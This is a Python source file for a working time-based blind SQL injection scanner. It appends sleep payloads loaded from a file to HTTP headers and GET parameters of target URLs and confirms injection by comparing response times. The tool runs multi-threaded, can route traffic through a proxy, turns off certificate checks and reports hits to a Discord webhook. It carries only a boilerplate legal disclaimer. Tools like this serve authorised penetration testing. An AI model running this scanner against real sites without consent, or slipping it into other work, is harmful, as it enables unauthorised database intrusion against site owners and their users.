import argparse
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
import os
import json
import validators
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from termcolor import colored
from colorama import Fore, Style, init
import time
import logging
from urllib.parse import urlparse, parse_qs, urlencode

# Initialize colorama for colored text output in terminals
init()

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Create a requests session and set the default User-Agent
session = requests.Session()
session.headers.update({'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})

# List to store detected URLs
detected = []

# Default file names for payloads and headers
default_payloads_file = 'payloads.txt'
default_headers_file = 'headers.txt'

# Set up logger
logger = logging.getLogger()
logger.setLevel(logging.INFO)

def is_valid_url(url):
    """Validate if the given string is a URL."""
    return validators.url(url)

def send_discord_notification(webhook_url, url, param, payload):
    """Send a notification to a Discord webhook when SQL injection is detected."""
    discord_data = {
        "content": f"SQL injection detected!\nURL: {url}\nParameter: {param}\nPayload: {payload}"
    }
    session.post(webhook_url, json=discord_data)

def validate_sql_injection(url, header, payload, discord_webhook=None, proxy=None):
    """Validate the SQL injection by comparing response times with and without the payload."""
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    if url in detected:
        return

    try:
        # Prepare the header for the normal request
        normal_header = {h.split(': ')[0]: h.split(': ')[1] for h in [header]}
        response_normal = session.get(url, headers=normal_header, verify=False, proxies=proxies)
        normal_time = response_normal.elapsed.total_seconds()
        print(colored(f"{Fore.BLUE}[Time Check]{Style.RESET_ALL} {Fore.WHITE} {url} normal response time is {response_normal.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))

        # Prepare the header for the 15-second sleep payload
        payload_15 = payload.replace("%__TIME_OUT__%", "15")
        headers_15s = {h.split(': ')[0]: h.split(': ')[1] + payload_15 for h in [header]}
        response_15s = session.get(url, headers=headers_15s, verify=False, proxies=proxies)
        print(colored(f"{Fore.BLUE}[False-Positive Check]{Style.RESET_ALL} {Fore.WHITE}Sleep time was set to 15 seconds: {url} Server Response Time is {response_15s.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))

        if response_15s.elapsed.total_seconds() >= 14:
            # Prepare the header for the 5-second sleep payload
            payload_5 = payload.replace("%__TIME_OUT__%", "5")
            headers_5s = {h.split(': ')[0]: h.split(': ')[1] + payload_5 for h in [header]}
            response_5s = session.get(url, headers=headers_5s, verify=False, proxies=proxies)

            print(colored(f"{Fore.BLUE}[False-Positive Check]{Style.RESET_ALL} {Fore.WHITE}Sleep time was set to 5 seconds: {url} Server Response Time is {response_5s.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))

            if response_5s.elapsed.total_seconds() < response_15s.elapsed.total_seconds()/2 + response_normal.elapsed.total_seconds():
                print(colored("~~~", 'green'))
                print(colored("[CONFIRMED] Time-based Blind Injection verified", 'green', attrs=['bold']))
                print(colored(f"    Target: {url}\n    Header: {header}\n    Vector: {payload}", 'green'))
                print(colored("~~~", 'green'))

                # Log the detected URL
                logger.info(f"{url}|{header}|{payload}")
                detected.append(url)

                # Send Discord notification if webhook URL is provided
                if discord_webhook:
                    send_discord_notification(discord_webhook, url, header, payload)
            else:
                print(colored(f"[False-Positive]  {url} might be false positive. Test manually.", 'white'))
        else:
            print(colored(f"[False-Positive]  {url} is might be false positive. Test manually.", 'white'))

    except requests.RequestException as e:
        print(colored(f"[ERROR] An error occurred during validation: {e}", 'red'))

def validate_sql_injectionGetParam(url, param, original_value, payload, discord_webhook=None, proxy=None):
    """Validate the SQL injection by comparing response times with and without the payload for GET parameters."""
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    if url in detected:
        return

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query, keep_blank_values=True)

    try:
        # Set the parameter to its original value and send a normal request
        query_params[param] = [original_value]
        normal_query = urlencode(query_params, doseq=True)
        normal_url = parsed_url._replace(query=normal_query).geturl()
        response_normal = session.get(normal_url, verify=False, proxies=proxies)
        normal_time = response_normal.elapsed.total_seconds()
        print(colored(f"{Fore.BLUE}[Time Check]{Style.RESET_ALL} {Fore.WHITE} {normal_url} normal response time is {response_normal.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))

        # Validate with 15 seconds sleep payload
        payload_15 = payload.replace("%__TIME_OUT__%", "15")
        query_params[param] = [original_value + payload_15]
        modified_query_15 = urlencode(query_params, doseq=True)
        modified_url_15 = parsed_url._replace(query=modified_query_15).geturl()
        response_15s = session.get(modified_url_15, verify=False, proxies=proxies)
        print(colored(f"{Fore.BLUE}[False-Positive Check]{Style.RESET_ALL} {Fore.WHITE}Sleep time was set to 15 seconds: {modified_url_15} Server Response Time is {response_15s.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))

        if response_15s.elapsed.total_seconds() >= 14:
            # Validate with 5 seconds sleep payload
            payload_5 = payload.replace("%__TIME_OUT__%", "5")
            query_params[param] = [original_value + payload_5]
            modified_query_5 = urlencode(query_params, doseq=True)
            modified_url_5 = parsed_url._replace(query=modified_query_5).geturl()
            response_5s = session.get(modified_url_5, verify=False, proxies=proxies)
            print(colored(f"{Fore.BLUE}[False-Positive Check]{Style.RESET_ALL} {Fore.WHITE}Sleep time was set to 5 seconds: {modified_url_5} Server Response Time is {response_5s.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))

            if response_5s.elapsed.total_seconds() < response_15s.elapsed.total_seconds() / 2 + response_normal.elapsed.total_seconds():
                print(colored("~~~", 'green'))
                print(colored("[CONFIRMED] Time-based Blind Injection verified", 'green', attrs=['bold']))
                print(colored(f"    Target: {url}\n    Parameter: {param}\n    Vector: {payload}", 'green'))
                print(colored("~~~", 'green'))

                # Log the detected URL
                logger.info(f"{url}|{param}|{payload}")
                detected.append(url)

                # Send Discord notification if webhook URL is provided
                if discord_webhook:
                    send_discord_notification(discord_webhook, url, param, payload)
            else:
                print(colored(f"[False-Positive] {url} might be a false positive. Test manually.", 'white'))
        else:
            print(colored(f"[False-Positive] {url} might be a false positive. Test manually.", 'white'))

    except requests.RequestException as e:
        print(colored(f"[ERROR] An error occurred during validation: {e}", 'red'))

def process_url(url, sql_query, headers, discord_webhook, proxy):
    """Process a single URL by injecting SQL payloads and checking for SQL injection vulnerabilities."""
    for header in headers:
        if url in detected:
            break

        # Modify the payload time for the initial request
        payload = sql_query.replace("%__TIME_OUT__%", "10")
        headers_dict = {h.split(': ')[0]: h.split(': ')[1] + payload for h in [header]}
        response = session.get(url, headers=headers_dict, verify=False, proxies={'http': proxy, 'https': proxy})

        if response.elapsed.total_seconds() >= 9:
            print(colored(f"[DETECTED] SQL Injection found on {url}", 'red', attrs=['bold']))
            print(colored(f"{header} {payload}", 'white'))

            # Validate SQL injection
            if url not in detected:
                validate_sql_injection(url, header, sql_query, discord_webhook, proxy)

def read_headers_from_file(headers_file):
    """Read HTTP headers from a file."""
    if not os.path.isfile(headers_file):
        print(colored(f"[ERROR] The specified headers file '{headers_file}' does not exist.", 'red'))
        return []

    with open(headers_file, 'r') as file:
        return file.read().splitlines()

def process_get_parameters(url, sql_query, discord_webhook, proxy):
    """Process GET parameters by injecting SQL payloads and checking for SQL injection vulnerabilities."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query, keep_blank_values=True)

    for param in query_params:
        if url in detected:
            break
        original_value = query_params[param][0] if query_params[param] else ""

        # Modify the payload time for the initial request
        payload = sql_query.replace("%__TIME_OUT__%", "10")
        query_params[param] = [original_value + payload]
        modified_query = urlencode(query_params, doseq=True)
        modified_url = parsed_url._replace(query=modified_query).geturl()
        response = session.get(modified_url, verify=False, proxies={'http': proxy, 'https': proxy})

        if response.elapsed.total_seconds() >= 9:
            print(colored(f"[DETECTED] SQL Injection found on {url}", 'red', attrs=['bold']))
            print(colored(f"Parameter: {param} Payload: {payload}", 'white'))

            # Validate SQL injection using the new function
            if url not in detected:
                validate_sql_injectionGetParam(modified_url, param, original_value, sql_query, discord_webhook, proxy)

        # Reset the parameter to its original value before continuing
        query_params[param] = [original_value]

def main():
    """Main function to parse arguments and start the SQL injection detection."""
    parser = argparse.ArgumentParser(description='Detect SQL injection by sending malicious queries')
    parser.add_argument('-u', '--url', help='Single URL for the target')
    parser.add_argument('-r', '--urls_file', help='File containing a list of URLs')
    parser.add_argument('-p', '--pipeline', action='store_true', help='Read from pipeline')
    parser.add_argument('-o', '--output', action='store', dest="output_file", help="Output file to write results to", type=str, default=None)
    parser.add_argument('--proxy', help='Proxy for intercepting requests (e.g., http://127.0.0.1:8080)', default=None)
    parser.add_argument('--payload', help='File containing malicious payloads (default is payloads.txt)', default=default_payloads_file)
    parser.add_argument('--single-payload', help='Single payload for testing')
    parser.add_argument('--discord', help='Discord Webhook URL')
    parser.add_argument('--headers', help='File containing headers (default is headers.txt)', default=default_headers_file)
    parser.add_argument('--threads', type=int, help='Number of threads', default=1)
    parser.add_argument('--getparams', action='store_true', help='Test GET parameters for SQL injection')

    args = parser.parse_args()

    if args.url:
        urls = [args.url]
    elif args.urls_file:
        if not os.path.isfile(args.urls_file):
            print(colored(f"[ERROR] The specified file does not exist.", 'red'))
            return

        with open(args.urls_file, 'r') as file:
            url_lines = file.read().splitlines()
            unique_urls = list(set(url_lines))
            urls = unique_urls
    elif args.pipeline:
        # Read URLs from pipeline
        url_lines = [url.strip() for url in sys.stdin.readlines()]
        unique_urls = list(set(url_lines))

        if len(unique_urls) < len(url_lines):
            print(f"Removing {len(url_lines) - len(unique_urls)} duplicate URLs.")

        urls = unique_urls
    else:
        parser.error('Please provide either a single URL, a file with a list of URLs, or use the pipeline option.')

    payloads_file = args.payload

    if args.single_payload:
        payloads = [args.single_payload]
    elif os.path.isfile(payloads_file):
        with open(payloads_file, 'r') as file:
            payloads = file.read().splitlines()
    else:
        print(colored(f"[ERROR] The specified payload file '{payloads_file}' does not exist.", 'red'))
        return

    headers_file = args.headers
    headers = read_headers_from_file(headers_file)

    if args.output_file:
        file_handler = logging.FileHandler(args.output_file)
        file_handler.setFormatter(logging.Formatter('%(message)s'))
        logger.addHandler(file_handler)
        logger.info("URL|HEADER|PAYLOAD")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        print(colored("\n\033[3;93mLegal Disclaimer: Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.\033[0m", 'yellow'))
        start_time = datetime.now()  # Record the start time
        print(colored(f"\n[*] Starting @ {start_time.strftime('%H:%M:%S %Y-%m-%d')}\n\n", 'white'))

        for url in urls:
            if url in detected:
                return
            if is_valid_url(url):
                if args.getparams:
                    for sql_query in payloads:
                        if url in detected:
                            break
                        executor.submit(process_get_parameters, url, sql_query, args.discord, args.proxy)
                else:
                    for sql_query in payloads:
                        if url in detected:
                            break
                        executor.submit(process_url, url, sql_query, headers, args.discord, args.proxy)
            else:
                print(colored(f"[ERROR] Invalid URL: {url}", 'red'))

    end_time = datetime.now()  # Record the end time
    print(colored(f"\n\n[*] Finished @ {end_time.strftime('%H:%M:%S %Y-%m-%d')}", 'white'))
    print(colored(f"[*] Duration: {end_time - start_time}", 'white'))

if __name__ == '__main__':
    main()
